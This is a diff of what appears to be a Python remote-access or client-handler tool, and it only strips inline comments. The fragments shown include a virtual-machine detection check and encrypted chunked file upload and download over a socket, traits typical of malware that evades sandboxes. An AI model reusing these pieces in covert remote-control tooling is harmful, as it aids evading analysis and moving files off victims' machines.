@@ -73,7 +73,7 @@ def check_vm():
             except:
                 pass
                 
-        else:  # Linux
+        else:  
             
             try:
                 system_info = subprocess.check_output("systemd-detect-virt", shell=True).decode().lower()
@@ -341,7 +341,7 @@ class ClientHandler:
                 for i in range(num_blocks):    
                     try:
                         data = self.connection.recv(1024)
-                        if not data:  # Connection closed
+                        if not data:
                             raise ConnectionError("Connection lost during download")
                         decrypted_data = decrypt(data)
                         file.write(decrypted_data)
@@ -352,7 +352,7 @@ class ClientHandler:
                 
                 try:
                     data = self.connection.recv(remaining_bytes)
-                    if not data:  # Connection closed
+                    if not data:
                         raise ConnectionError("Connection lost during download")
                     decrypted_data = decrypt(data)
                     file.write(decrypted_data)
@@ -424,7 +424,7 @@ class ClientHandler:
                 for i in range(num_blocks):
                     try:
                         data_chunk = file.read(1024)
-                        if not data_chunk:  # End of file
+                        if not data_chunk:
                             break
                         encrypted_chunk = encrypt(data_chunk)
                         self.send(encrypted_chunk)
@@ -436,7 +436,7 @@ class ClientHandler:
                 
                 try:
                     data_chunk = file.read(remaining_bytes)
-                    if data_chunk:  # Only send if there's remaining data
+                    if data_chunk:
                         encrypted_chunk = encrypt(data_chunk)
                         self.send(encrypted_chunk)
                 except Exception as e:
